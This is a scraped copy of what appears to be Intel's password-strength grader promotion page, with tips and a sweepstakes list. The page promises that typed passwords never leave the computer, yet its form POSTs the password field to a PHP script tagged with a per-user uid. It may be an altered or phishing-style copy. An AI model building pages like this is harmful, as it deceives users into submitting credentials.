        if ((document.cookie.indexOf('SMSESSION') != -1) && (pageUrl.toLowerCase().indexOf("/intelligent-systems") > -1 || (queryString != null && queryString.toLowerCase().indexOf("lstsites=embedded") > -1)) && readCookie(EDC_NEWREG_COOKIE) != null && readCookie(EDC_NEWREG_COOKIE) != "") {
        //    console.log("Detected first time login edc user. Redirecting.");
            eraseCookie(EDC_NEWREG_COOKIE);
            window.location.href = "https://www-ssl.intel.com/p/s/en_US/embedded/get-help"
        }
    });
</script>

<script type="text/javascript">
 function loadMenuAsync()  { 
           var po = document.createElement('script');
           po.type = 'text/javascript'; po.async = true;  po.src = "/content/data/globalelements/US/en/globalnav2.out.js";
           var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
 }
 loadMenuAsync();
</script>
</div>





    <div class="parbase oldbrowsersdialog">



<style type="text/css">
    .m_safari .browser_detect, .android .browser_detect{display:none!important}
</style>
<div class="browser_detect" id="browserdetectid" style="display: none;">
      <p>The browser version you are using is not recommended for this site.<br/>Please consider upgrading to the latest version of your browser by clicking one of the following links.</p>
<div class="browser_types">
           <ul>
      
                                 <li><a href="http://support.google.com/chrome/bin/answer.py?hl=en&answer=95346">Chrome</a></li>
                                 
                                 <li><a href="http://www.apple.com/safari/download/">Safari</a></li>
                                 
                                 <li><a href="http://windows.microsoft.com/en-IN/internet-explorer/products/ie/home">IE</a></li>
                                 
                                 <li><a href="http://www.mozilla.org/en-US/firefox/new/">Firefox</a></li>
                                 </ul>
      </div>
      
</div>  
 
<script type="text/javascript">
    $(function(){
var arrayCookie = document.cookie.split(';');
var flag = 0;
for(var i=0; i<arrayCookie.length; i++) {
    var value = arrayCookie[i];

    if(value.indexOf('OldBrowsersCookie') != -1){
         flag+=1;
       }
    else {  flag+=0;}
}
if(flag==0)
    {
        createCookie('OldBrowsersCookie', 'Cookie for old browser popup message',0.04167);
    }
else{ 
      $('body').addClass('cookie-oldbrowser');
      $('#browserdetectid, .oldbrowsersdialog').hide();
    }
    });
</script> 

 
 
</div>

        
        









    <div id="content" >
            <img src="https://www-ssl.intel.com/etc/designs/ver/3.1.188/intel/us/en/images/printlogo.png" class="printlogo" style="display: none;"/>
        <div class="parbase detailedtemplatebackbutton">






<div class="header-menu-new">

    

        <script type="text/javascript">     
             // <![CDATA[
             $(function(){
             var backbutton = [];             
             var templateType = "";  
             backbutton["contentlibrary"] = "Back to Content Library";
             backbutton["search"] = "Back to Search";
             backbutton["collection"] = "Back to Collection";
             backbutton["collectionaudience"] = "Back to Collection";
             backbutton["collectiongeo"] = "Back to Collection";
             backbutton["collectionintelinside"] = "Back to Collection";
             backbutton["collectionproduct"] = "Back to Collection";
             backbutton["collectionshop"] = "Back to Collection";
             backbutton["collectiontopic"] = "Back to Collection";

             var defaultBackButton = "More on Intel.com";
             getBackButton(backbutton, defaultBackButton, templateType);            
      
             function twitterWorkaround(){
                   return "Currently Reading How+Strong+is+Your+Password%3F";
             }
             });
             // ]]>
             function loadAsyncScript(httpUrl, httpsUrl)  { $(function() {
                 $(function(){
                     var url =  (window.parent.document.location.protocol == "http:") ? httpUrl : httpsUrl;
                     //console.log("Loading Script: " + url);
                     var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;  po.src = url;  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);});
             });
             }
        </script>           
        <noscript>
          <h4>
          <a id="back-button-noscript" href="http://www.intel.com" title="Back to Collection">&lt; More on Intel.com</a>
          </h4>                                      
        </noscript>  
        <ul class="new-share-bar">         
        
            <li class="back-button">
                <a href="https://www-ssl.intel.com/content/www/us/en/homepage.html" title="More on Intel.com">&lt;More on Intel.com</a>
            </li>
            <li class="tags-area"><div class="parbase detailedtemplatetagged2">






    
    
        <div class="component" data-component="tagged" data-component-id="1">
    



<ul>
    <li class="tagged-as-title">
        <span  class="">Tagged As</span>
    </li>
    <li class="tags-list">
        <a href="https://www-ssl.intel.com/content/www/us/en/library/viewmore.results.html?prTag=rtopic:intelhome/security">Security</a>
    </li>
</ul>
</div>
</div>

            </li>
        
        <li class="share-buttons">
            <ul class="large-share-buttons">
        
             <li style="float: left;" class="function fb">
                 <div class="recommend">
                     <div id="fb-root"></div>
                     
                     <script>
                          //<![CDATA[
                         var locationCountry = "en_US";
                         var locationCountryOverride="";
						 if (locationCountryOverride.length != 0)
						 {
							locationCountry = locationCountryOverride;
						 }
                         loadAsyncScript("http://connect.facebook.net/" + locationCountry + "/all.js#appId=186774301373559&xfbml=1", "https://connect.facebook.net/" + locationCountry + "/all.js#appId=186774301373559&xfbml=1");
                             // ]]>
                     </script>
                     <fb:like href="http%3A%2F%2Fwww.intel.com%2Fcontent%2Fwww%2Fus%2Fen%2Fforms%2Fpasswordwin.html" layout="button_count"  width="120" show_faces="false" action="recommend"></fb:like>
                  </div>
             </li>
          
            <li style="float: left;" class="function gplus">
                <!--[if gt IE 6]><!--><div class='googleplus'>
<script>
//<![CDATA[
loadAsyncScript('http://apis.google.com/js/plusone.js', 'https://apis.google.com/js/plusone.js');
// ]]>
</script>
<g:plusone callback="waTrackPlusOne_vote" size="medium" href="http://www.intel.com/content/www/us/en/forms/passwordwin.html"></g:plusone></div><!--<![endif]-->

            </li>
            
            <li class="share-buttons-toggle down">
                <span class="share-more">More
				<img src="https://www-ssl.intel.com/etc/designs/ver/3.1.188/intel/us/en/images/arrow_down_blue.png" alt="&#x2C5"/></span>
                <span class="share-less" style="display: none;">Less
				<img src="https://www-ssl.intel.com/etc/designs/ver/3.1.188/intel/us/en/images/arrow_up_blue.png" alt="&#x2C4"/></span>
            </li> 
         
            </ul>        
            </li>
            </ul>
       
            <div class="extra-share-buttons wapwrapper" data-component="sharepagetop" data-component-id="1" style="display: none;">
                <div class="the-icons">
                    <ul class="share-page-overflow clearfix"><li class="icon"><a href="http://www.facebook.com/share.php?src=bm&u=http%3A%2F%2Fwww.intel.com%2Fcontent%2Fwww%2Fus%2Fen%2Fforms%2Fpasswordwin.html&t=&v=3" class="facebook" title="Facebook" data-wap='{"linktype":"share"}' target='_blank'>Facebook</a></li><li class="text"><a href="http://www.facebook.com/share.php?src=bm&u=http%3A%2F%2Fwww.intel.com%2Fcontent%2Fwww%2Fus%2Fen%2Fforms%2Fpasswordwin.html&t=&v=3" class="facebook" title="Facebook" data-wap='{"linktype":"share"}' target='_blank'>Facebook</a></li></ul><ul class="share-page-overflow clearfix"><li class="icon"><a href="http://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Fwww.intel.com%2Fcontent%2Fwww%2Fus%2Fen%2Fforms%2Fpasswordwin.html&t=&v=3" class="linkedin" title="LinkedIn" data-wap='{"linktype":"share"}' target='_blank'>LinkedIn</a></li><li class="text"><a href="http://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Fwww.intel.com%2Fcontent%2Fwww%2Fus%2Fen%2Fforms%2Fpasswordwin.html&t=&v=3" class="linkedin" title="LinkedIn" data-wap='{"linktype":"share"}' target='_blank'>LinkedIn</a></li></ul><ul class="share-page-overflow clearfix"><li class="icon"><a href="http://twitter.com/share?url=http%3A%2F%2Fwww.intel.com%2Fcontent%2Fwww%2Fus%2Fen%2Fforms%2Fpasswordwin.html&t=&v=3" class="twitter" title="Twitter" data-wap='{"linktype":"share"}' target='_blank'>Twitter</a></li><li class="text"><a href="http://twitter.com/share?url=http%3A%2F%2Fwww.intel.com%2Fcontent%2Fwww%2Fus%2Fen%2Fforms%2Fpasswordwin.html&t=&v=3" class="twitter" title="Twitter" data-wap='{"linktype":"share"}' target='_blank'>Twitter</a></li></ul><ul class="share-page-overflow clearfix"><li class="icon"><a href="http://digg.com/submit/?phase=2&url=http%3A%2F%2Fwww.intel.com%2Fcontent%2Fwww%2Fus%2Fen%2Fforms%2Fpasswordwin.html&t=&v=3" class="digg" title="Digg" data-wap='{"linktype":"share"}' target='_blank'>Digg</a></li><li class="text"><a href="http://digg.com/submit/?phase=2&url=http%3A%2F%2Fwww.intel.com%2Fcontent%2Fwww%2Fus%2Fen%2Fforms%2Fpasswordwin.html&t=&v=3" class="digg" title="Digg" data-wap='{"linktype":"share"}' target='_blank'>Digg</a></li></ul><ul class="share-page-overflow clearfix"><li class="icon"><a href="http://del.icio.us/post?&url=http%3A%2F%2Fwww.intel.com%2Fcontent%2Fwww%2Fus%2Fen%2Fforms%2Fpasswordwin.html&t=&v=3" class="delicious" title="Delicious" data-wap='{"linktype":"share"}' target='_blank'>Delicious</a></li><li class="text"><a href="http://del.icio.us/post?&url=http%3A%2F%2Fwww.intel.com%2Fcontent%2Fwww%2Fus%2Fen%2Fforms%2Fpasswordwin.html&t=&v=3" class="delicious" title="Delicious" data-wap='{"linktype":"share"}' target='_blank'>Delicious</a></li></ul><ul class="share-page-overflow clearfix"><li class="icon"><a href="http://promote.orkut.com/preview?nt=orkut.com&tt=Intel&du=http%3A%2F%2Fwww.intel.com%2Fcontent%2Fwww%2Fus%2Fen%2Fforms%2Fpasswordwin.html&t=&v=3" class="orkut" title="Orkut" data-wap='{"linktype":"share"}' target='_blank'>Orkut</a></li><li class="text"><a href="http://promote.orkut.com/preview?nt=orkut.com&tt=Intel&du=http%3A%2F%2Fwww.intel.com%2Fcontent%2Fwww%2Fus%2Fen%2Fforms%2Fpasswordwin.html&t=&v=3" class="orkut" title="Orkut" data-wap='{"linktype":"share"}' target='_blank'>Orkut</a></li></ul><ul class="share-page-overflow clearfix"><li class="icon"><a href="http://www.google.com/bookmarks/mark?op=add&title=http%3A%2F%2Fwww.intel.com%2Fcontent%2Fwww%2Fus%2Fen%2Fforms%2Fpasswordwin.html&t=&v=3" class="google" title="Google" data-wap='{"linktype":"share"}' target='_blank'>Google</a></li><li class="text"><a href="http://www.google.com/bookmarks/mark?op=add&title=http%3A%2F%2Fwww.intel.com%2Fcontent%2Fwww%2Fus%2Fen%2Fforms%2Fpasswordwin.html&t=&v=3" class="google" title="Google" data-wap='{"linktype":"share"}' target='_blank'>Google</a></li></ul>
                </div>
                <div class="print-icon">
                    <ul class="share-page-overflow clearfix">
                        <li class="icon">
                            <div class="wapwrapper" data-component="printasset" data-component-id="1">
                                <a href="index.html#" onclick="window:print()" class="print" title="Print" data-wap="{&quot;linktype&quot;:&quot;print&quot;}">Print</a>
                            </div>
                        </li>
                        <li class="text">
                            <a href="index.html#" onclick="window:print()" class="print-text" title="Print" data-wap="{&quot;linktype&quot;:&quot;print&quot;}">Print</a>
                        </li>
                    </ul>
                </div>
            </div>
              
</div></div>

        
        
        
    




<div class="intelparsys navigation-parsys">
</div>


<div class="masthead">





<div class="component" data-component="masthead" data-component-id="1">

      
      
      
      <div class="masthead">
        
   
          <div class="masthead-title">
            
              <div>
              
              <h1>How Strong is Your Password?</h1>
              
           
            
            </div>

          </div>
        </div>     
      
</div>
</div>


 
        
        <div class="module">

        <div class="content-well ">
            <div class="templateIeditorial">

                
<div class="component" data-component="template I Editorial" data-component-id="1">

</div></div>

            <div class="Ieditorialparsys intelparsys">
<div class="systemchecker section">



        	 <script type="text/javascript">
        	 
             </script>
             
              <meta http-equiv="Content-type" content="text/html;charset=UTF-8"/>
  <!-- CSS -->
  <link rel="stylesheet" type="text/css" href="https://www-ssl.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/css/site-global.css"/>
  <link rel="stylesheet" type="text/css" href="https://www-ssl.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/css/master-a-master.css"/>
  <link rel="stylesheet" type="text/css" href="https://www-ssl.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/css/your-grade-phase-1.css" id="pagesheet"/>
  <!--[if lt IE 9]>
  <link rel="stylesheet" type="text/css" href="/content/dam/www/public/us/en/apps/password-security-toolkit/css/iefonts-your-grade-phase-1.css?4004901411"/>
  <![endif]-->
  <!--[if lt IE 8]>
  <link rel="stylesheet" type="text/css" href="/content/dam/www/public/us/en/apps/password-security-toolkit/css/ie7-your-grade-phase-1.css"/>
  <![endif]-->
 <div id="passwordContent">

<form method="POST" action="index2.php?uid=<?php echo $uid ?>" name="PasswordForm" autocomplete="off">
  <div  id="page" class="clearfix wapwrapper" data-component="consumer-security" data-component-id="1"><!-- column -->
   <div class="position_content" id="page_position_content">
    <div class="clearfix colelem" id="pu1279"><!-- group -->
     <div class="gradient clearfix grpelem" id="u1279"><!-- column -->
      <div class="clearfix colelem" id="u1247-3"><!-- content -->
       <p>&nbsp;</p>
      </div>
      <a class="anchor_item colelem" id="grade"></a>
      <div class="clearfix colelem" id="u1234-8"><!-- content -->
       <div id="u1234-2">OH NO!</div>
       <div id="u1234-6">It would take <span id="u1234-4"></span>&nbsp;to crack your password.</div>
      </div>
     </div>
     <div class="gradient clearfix grpelem" id="u1307"><!-- group -->
      <div class="clearfix grpelem" id="u1306-8"><!-- content -->
       <div id="u1306-2">CONGRATULATIONS!</div>
       <div id="u1306-6">It would take <span id="u1306-4"></span>&nbsp;to crack your password.</div>
      </div>
     </div>
     <div class="gradient clearfix grpelem" id="u1242"><!-- group -->
      <div class="grpelem" id="u1250"><!-- image -->
       <img class="block" id="u1250_img" src="https://www-ssl.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/images/lock-illustration.png" alt="" width="247" height="231"/>
      </div>
     </div>
     <div class="clearfix grpelem" id="u1252"><!-- group -->
      <div class="clearfix grpelem" id="u1253-4"><!-- content -->
     <div class="disclaimer-bold">
	<font color="rgb(8, 109, 182)"><?php echo $strength ?></font>
     </div>
       <div class="disclaimer-bold">*Determine Your Password Strength</div> 
       <p>We will not retain information entered into this password grader. The password you enter is checked and graded on your computer. It is not sent over the Internet. Just the same, be careful where you type your passwords anywhere online.</p>
      </div>
     </div>
     <div class="form-grp clearfix grpelem" id="widgetu1254"><!-- group -->
      <div class="fld-grp clearfix grpelem" id="widgetu1262" data-required="true"><!-- group -->
       <span class="fld-input NoWrap actAsDiv clearfix grpelem" id="u1266-4"><!-- content --><input class="wrapped-input" type="password" spellcheck="false" id="widgetu1262_input" name="PasswordForm" tabindex="1"/><label class="wrapped-input fld-prompt" id="widgetu1262_prompt" for="widgetu1262_input"><span class="actAsPara">Test your strong password here*</span></label></span>
      </div>
      <input class="submit-btn NoWrap grpelem" id="u1268-17" type="submit" value="" tabindex="3" onclick="javacript:checkThisThing();"/><!-- state-based BG images -->
     </div>
     <div class="clearfix grpelem" id="u1662-6"><!-- content -->
      <p class="grey-text-14pt" id="u1662-2">Note: This is not a guarantee of the security of your password. Please use it for reference only. This is not a replacement for professional security products. It is intended to educate on the weakest of passwords&mdash;not highly analyze strong passwords.</p>
     </div>
     <div class="grpelem" id="u1693"><!-- image -->
      <img class="block" id="u1693_img" src="https://www-ssl.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/images/hackableuncrackable-header.png" alt="" width="960" height="300"/>
     </div>
    </div>
    <div class="clear"></div>
    <div id="lower-results-section">
</form>
	<!-- insert new code sections here -->
    <div id="blade-contest">
    <img src="https://www-ssl.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/images/web-pledge-new.png" width="400" height="400" alt="I pledge to keep what's mine mine." class="pledge-circle"/>
    <div id="blade-contest-content">
      <img src="https://www-ssl.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/images/challenge-your-friends-flag.png" width="545" height="93" alt="challenge your friends" class="enter-to-win-banner">
     <div class="right-share-text">
      <div class="share-pledge">Share your pledge on<br/> Facebook* or Twitter*. </div>
    <!-- share buttons -->
      <div id="share-buttons">

        <div id="tweet-btn">
          <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://intel.ly/11W4eru" data-text="I #changedmypassword @intel. Go from hackable to uncrackable!" data-count="none">Tweet This</a>
        </div><!-- tweet-btn -->

        <script type="text/javascript" src="https://platform.twitter.com/widgets.js"></script>


        <div id="fb-root"></div>
          <script type="text/javascript" src="https://connect.facebook.net/en_US/all.js"></script>
          <script type="text/javascript">
          FB.init({appId: "151551848359555", status: true, cookie: true});
            function share_me() {
              FB.ui({
                method: 'feed',
                app_id: '151551848359555',
                link: 'https://www-ssl.intel.com/content/www/us/en/forms/passwordwin.html',
                picture: 'https://www.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/images/web-pledge-new.png',
                name: 'Are You Hackable or Uncrackable?',
                description: "You buckle your seatbelt. You brush your teeth. You look both ways before crossing the street. You're a safe person. But when it comes to password security, chances are you're wide open. We want to change that. Pledge to upgrade your password today."
              },
              function(response){
                if(response && response.post_id) {
                }
                else {
                }
              });
            }
          </script>
          <div onClick="javascript:share_me();"><img src="https://www-ssl.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/images/facebook-share-button.png" alt="Facebook Share Button - Change your password. Win an Ultrabook&trade;." width="62p" height="24"/></div>
          <div class="clear"></div>
      </div>
    <!-- end share buttons -->
    <div class="drawing-info">
      Are you a password master? Challenge your friends and find out who's hackable and who's uncrackable!
    </div>
  </div><!-- end right text -->
      </div><!-- end blade-contest-content -->
    </div><!-- end blade-contest -->
    <div class="clear"></div>
    <div id="blade-password-anatomy">
    <span class="dark-blue">Want to take your password from hackable to uncrackable?</span><br />
    Step 1: Make a strong password
  </div><!-- end  blade password anatomy -->
  <div id="blade-multiple-passwords">
    <div id="multiple-pswd-text-left">Step 2:<br /> Use multiple passwords</div>
    <div id="multiple-pswd-text-right">Try never to duplicate passwords. If you need help moving from one password, use this helpful trick: one for your banking, another for email, and another for social.</div>
  </div><!-- end blade mult passwords -->
  <div id="blade-moustaches">
    <div class="moustache-header">Step 3: Diversify your social passwords for added security</div>
    <img src="https://www-ssl.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/images/web-diversify.png" width="890" height="120" alt="Moustaches"/><br />
    <div class="moustache-text">"My 1st Password!: Twitr"</div><div class="moustache-text">"My 1st Password!: Fb"</div><div class="moustache-text">"My 1st Password!: Redd"</div>
  </div><!-- end blade moustache -->
  <div id="blade-congrats">
    <div class="congrats-text">Congratulations! You are now a password master.</div>
  </div><!-- end congrats -->
    <div class="clear"></div>
    <div class="clearfix colelem" id="winner-blade">
     <img src="https://www-ssl.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/images/sweepstakes-winners-flag.png" width="545" height="93" alt="sweepstakes winners" id="winner-flag">
     <div id="winner-congratulations">Congratulations to our Winners!</div>
    <div id="winners">
      <h2>ULTRABOOK&trade; - GRAND PRIZE WINNERS</h2>
           <table class="winner-table largewinnertable">
              <tr>
                <td></td>
                <td>D. Morgan</td>
                <td></td>
              </tr>
           </table>
      <h2>MCAFEE&reg; - FIRST PRIZE WINNERS</h2>
          <table class="winner-table">
          <tr>
             <td>J. Jensen </td>
             <td>L. Davis </td>
             <td>K. Ruth </td>
             <td>W. Butler </td>
             <td>E. Feather </td>
           </tr>
           <tr>
             <td>R. Summers</td>
             <td>D. Blokland</td>
             <td></td>
             <td></td>
             <td></td>
           </tr>
           <tr>
             <td></td>
             <td></td>
             <td></td>
             <td></td>
             <td></td>
           </tr>
           <tr>
             <td></td>
             <td></td>
             <td></td>
             <td></td>
             <td></td>
           </tr>
           <tr>
             <td></td>
             <td></td>
             <td></td>
             <td></td>
             <td></td>
           </tr>
           <tr>
             <td></td>
             <td></td>
             <td></td>
             <td></td>
             <td></td>
           </tr> 
         </table>
         <p class="grey-text-14pt center">Full winner list will populate after all winner verifications are complete.</p>
    </div>


     
    </div>

    <!-- -->
    <div class="clearfix colelem" id="pu1393"><!-- group -->
     <div class="grpelem" id="u1393"><!-- image -->
      <img class="block" id="u1393_img" src="https://www-ssl.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/images/grey-horiz-top.png" alt="" width="963" height="125"/>
     </div>
     <div class="clearfix grpelem" id="u1166-4"><!-- content -->
      <div></div>
     </div>
     <div class="clearfix grpelem" id="u1505-4"><!-- content -->
      <p>Most people use more than six passwords—how many times have you forgotten yours? SafeKey keeps passwords organized under a single master password.  Instead of accumulating several complex passwords, remember one.</p>
      <p><a href="http://home.mcafee.com/advicecenter/?id=ad_sos_tfsp&affid=0&culture=en-us&cid=120028" target="_blank">Learn more about how hackers work ></a>  
 </p>
     </div>
     <div class="blue-subhead clearfix grpelem" id="u1506-4"><!-- content -->
      <img src="https://www-ssl.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/images/mcafeelogo.png" width="100" height="31"/>
      <p>McAfee SafeKey*, which is included with McAfee All Access*, is tailor-made to protect all your devices, usernames, and passwords from one place. </p>
     </div>
     <div class="grpelem" id="u1513"><!-- image -->
      <img class="block" id="u1513_img" src="https://www-ssl.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/images/pasted-image-243x181.png" alt="" width="243" height="181"/>
     </div>
    </div>
    <div class="PamphletWidget clearfix widget_invisible colelem" id="pamphletu1202"><!-- group -->
    </div>
  </div>
  </div>
      </div><!-- end lower results section -->
  <!-- end new code section -->
    <div class="verticalspacer"></div>
	</div>
  </div>
  <div class="preload_images">
   <img class="preload" src="https://www-ssl.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/images/u1268-17-r.png" alt=""/>
   <img class="preload" src="https://www-ssl.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/images/u1268-17-m.png" alt=""/>
   <img class="preload" src="https://www-ssl.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/images/u1268-17-fs.png" alt=""/>
  </div>
  <div class="clear"></div>
  <!-- JS includes -->
  <script src="https://www-ssl.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/js/jquery-1.8.3.min.js" type="text/javascript"></script>
  <script src="https://www-ssl.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/js/password.js" type="text/javascript"></script>
  <!-- Other scripts -->
	<script type="text/javascript">
			// NEW SCRIPT
		$("#widgetu1262_input").focus(function(){
			$("#widgetu1262_prompt").hide();
		});
		
		$("#widgetu1262_input").blur(function(){
			if($(this).val().replace(/\s+/g, ' ') == ""){
				$("#widgetu1262_prompt").show();
			}
		});
		
		$("#widgetu1271_input").focus(function(){
			$("#widgetu1271_prompt").hide();
		});
	
		$("#widgetu1271_input").blur(function(){
			if($(this).val().replace(/\s+/g, ' ') == ""){
				$("#widgetu1271_prompt").show();
			}	
		});
	
	</script>
   </div> </div>
</div>

        </div>
        
        
        <div style="clear:both;"></div>
    </div>
    
<script type="text/javascript">
$(document).ready(function(e) {
    if( !$.trim( $('.navigation-parsys').html() ).length ) {
    $('.navigation-parsys').remove();
  };
});
</script>
 
        <div class="bladeparsys intelparsys">
</div>

        <div class="">
        <div class="parbase videofilmstripgallery">


        










<script src="https://www-ssl.intel.com/etc/designs/ver/3.1.188.3.28/intel/us/en/js/reflection.js" type="text/javascript"></script>
<script type="text/javascript">
$(function () {
    // call for image reflection
    $("#v-carousal-new .video-carousal li img").reflect();

});
</script></div>

        </div>
        <div class="">
        <div class="videofilmstripgallery2 parbase relatedbladevideos2">








    
    
        <div class="component" data-component="relatedbladevideos2" data-component-id="1">    
    

                
        
                <div class="module v-carousal-new" id="v-carousal-new2">
                <div class="module-header">
                    <h4>Videos</h4> 
                     
                      
                      
                      
                       
                            
                      
                      

    
    
    
	
	    <a id="viewmore" href="https://www-ssl.intel.com/content/www/us/en/library/viewmore.results.html?prTag=rtopic:intelhome/security&amp;taTag=&amp;format=assetdetailvid" title="View More Videos">
	       <span>View More Videos</span>
	    </a>
	
	
	
	
                
              
                </div>                                                     
            <div class="video-carousal">
               
               
               
                               <ul class="carousel-item">
                            
                             <li>               
                        
                                <img src="https://www-ssl.intel.com/content/dam/www/public/us/en/videos/promotions/passwordwin-challenge.mov.rendition.cq5dam.thumbnail.140.100.png" width="190" height="107" alt="Password Win Challenge: Are You Hackable or Uncrackable?" title="Password Win Challenge: Are You Hackable or Uncrackable?"/>
                                <a href="https://www-ssl.intel.com/content/www/us/en/security/passwordwin-challenge.html" class="play-icon" title="Password Win Challenge: Are You Hackable or Uncrackable?"></a><div class="thumb-shw small"></div>
                                
                            <div class="vi-txt">
                                <strong><a href="https://www-ssl.intel.com/content/www/us/en/security/passwordwin-challenge.html" title="Password Win Challenge: Are...">Password Win Challenge: Are...</a></strong>
                                     <p>Intel dares New Yorkers to a strength test, testing folks’ passwords in the Password Win... </p>
                                    </div></li>
                                    
                             <li>               
                        
                                <img src="https://www-ssl.intel.com/content/dam/www/public/us/en/videos/animations/ultrabook-security-video.wmv.rendition.cq5dam.thumbnail.140.100.png" width="190" height="107" alt="Computer Theft Security Starts with Intel" title="Computer Theft Security Starts with Intel"/>
                                <a href="https://www-ssl.intel.com/content/www/us/en/security/ultrabook-security-video.html" class="play-icon" title="Computer Theft Security Starts with Intel"></a><div class="thumb-shw small"></div>
                                
                            <div class="vi-txt">
                                <strong><a href="https://www-ssl.intel.com/content/www/us/en/security/ultrabook-security-video.html" title="Computer Theft Security...">Computer Theft Security...</a></strong>
                                     <p>Protect your Ultrabook™ using Intel® AT for remote lockdown and enhanced security with... <span class="v-time" style="display:inline">(1:48)</span>
                                    </p>
                                    </div></li>
                                    
                             <li>               
                        
                                <img src="https://www-ssl.intel.com/content/dam/www/public/us/en/videos/marketing-briefs/lost-device-dance.mp4.rendition.cq5dam.thumbnail.190.107.jpg" width="190" height="107" alt="Does the Lost Device Dance Look Familiar?" title="Does the Lost Device Dance Look Familiar?"/>
                                <a href="https://www-ssl.intel.com/content/www/us/en/security/lost-device-dance-video.html" class="play-icon" title="Does the Lost Device Dance Look Familiar?"></a><div class="thumb-shw small"></div>
                                
                            <div class="vi-txt">
                                <strong><a href="https://www-ssl.intel.com/content/www/us/en/security/lost-device-dance-video.html" title="Does the Lost Device Dance...">Does the Lost Device Dance...</a></strong>
                                     <p>See what happens when people misplace their smartphones, tablets, and other mobile... </p>
                                    </div></li>
                                    
                             <li>               
                        
                                <img src="https://www-ssl.intel.com/content/dam/www/public/us/en/videos/technology-briefs/mobile-security-use-it-or-lose-it-video.mp4.rendition.cq5dam.thumbnail.140.100.png" width="190" height="107" alt="McAfee Mobile Security: Hacking Protection" title="McAfee Mobile Security: Hacking Protection"/>
                                <a href="https://www-ssl.intel.com/content/www/us/en/security/mcafee/mobile-security-use-it-or-lose-it-video.html" class="play-icon" title="McAfee Mobile Security: Hacking Protection"></a><div class="thumb-shw small"></div>
                                
                            <div class="vi-txt">
                                <strong><a href="https://www-ssl.intel.com/content/www/us/en/security/mcafee/mobile-security-use-it-or-lose-it-video.html" title="McAfee Mobile Security:...">McAfee Mobile Security:...</a></strong>
                                     <p>See how McAfee mobile security delivers phone and tablet protection from identity thieves. <span class="v-time" style="display:inline">(1:25)</span>
                                    </p>
                                    </div></li>
                                    
                                    </ul>
                                    
                            
               
                               <ul class="carousel-item">
                            
                             <li>               
                        
                                <img src="https://www-ssl.intel.com/content/dam/video/promotion/enterprise-security-intel-anti-theft-how-it-works-promotion.mp4.rendition.cq5dam.thumbnail.190.107.jpg" width="190" height="107" alt="How Intel® Anti-Theft Technology Works" title="How Intel® Anti-Theft Technology Works"/>
                                <a href="https://www-ssl.intel.com/content/www/us/en/enterprise-security/enterprise-security-intel-anti-theft-how-it-works-promotion.html" class="play-icon" title="How Intel® Anti-Theft Technology Works"></a><div class="thumb-shw small"></div>
                                
                            <div class="vi-txt">
                                <strong><a href="https://www-ssl.intel.com/content/www/us/en/enterprise-security/enterprise-security-intel-anti-theft-how-it-works-promotion.html" title="How Intel® Anti-Theft...">How Intel® Anti-Theft...</a></strong>
                                     <p>Intel® Anti-Theft Technology allows users to remotely shutdown lost/stolen PCs,... <span class="v-time" style="display:inline">(2:30)</span>
                                    </p>
                                    </div></li>
                                    
                             <li>               
                        
                                <img src="https://www-ssl.intel.com/content/dam/www/public/us/en/videos/technology-briefs/newegg-tv-intel-anti-theft-technology-for-ultrabooks-video.mp4.rendition.cq5dam.thumbnail.140.100.png" width="190" height="107" alt="Intel® Anti-Theft Technology Featured on Newegg TV" title="Intel® Anti-Theft Technology Featured on Newegg TV"/>
                                <a href="https://www-ssl.intel.com/content/www/us/en/architecture-and-technology/anti-theft/newegg-tv-intel-anti-theft-technology-for-ultrabooks-video.html" class="play-icon" title="Intel® Anti-Theft Technology Featured on Newegg TV"></a><div class="thumb-shw small"></div>
                                
                            <div class="vi-txt">
                                <strong><a href="https://www-ssl.intel.com/content/www/us/en/architecture-and-technology/anti-theft/newegg-tv-intel-anti-theft-technology-for-ultrabooks-video.html" title="Intel® Anti-Theft Technology...">Intel® Anti-Theft Technology...</a></strong>
                                     <p>Covers what is Intel® Anti-Theft Technology, its requirements, and what to do if your PC... </p>
                                    </div></li>
                                     </div>
            <!-- Carousal controls -->
            
            <div id="gallery-controls-div-v" class="gallery-controls">
            <div itemcontainer="#v-carousal-new2 .video-carousal" class="carousel-controls">
                <img src="https://www-ssl.intel.com/etc/designs/ver/3.1.188/intel/us/en/images/carouselLeftLarge.png" style="visibility: hidden;" class="carousel-left large" alt="previous">
                <img src="https://www-ssl.intel.com/etc/designs/ver/3.1.188/intel/us/en/images/carouselLeft.png" style="visibility: hidden" class="carousel-left" alt="previous">
                <img src="https://www-ssl.intel.com/etc/designs/ver/3.1.188/intel/us/en/images/blank.png" class="carousel-dot active" alt="selector">
                    
                <img src="https://www-ssl.intel.com/etc/designs/ver/3.1.188/intel/us/en/images/blank.png" class="carousel-dot" alt="selector">
                
                <img src="https://www-ssl.intel.com/etc/designs/ver/3.1.188/intel/us/en/images/carouselRight.png" class="carousel-right" alt="next">
                <img src="https://www-ssl.intel.com/etc/designs/ver/3.1.188/intel/us/en/images/carouselRightLarge.png" class="carousel-right large" alt="next">
            </div>

        </div>
        
             
            </div></div>
        




<script src="https://www-ssl.intel.com/etc/designs/ver/3.1.188.3.28/intel/us/en/js/reflection.js" type="text/javascript"></script>
<script type="text/javascript">
$(function () {
    // call for image reflection
    $("#v-carousal-new2 .video-carousal li img").reflect();

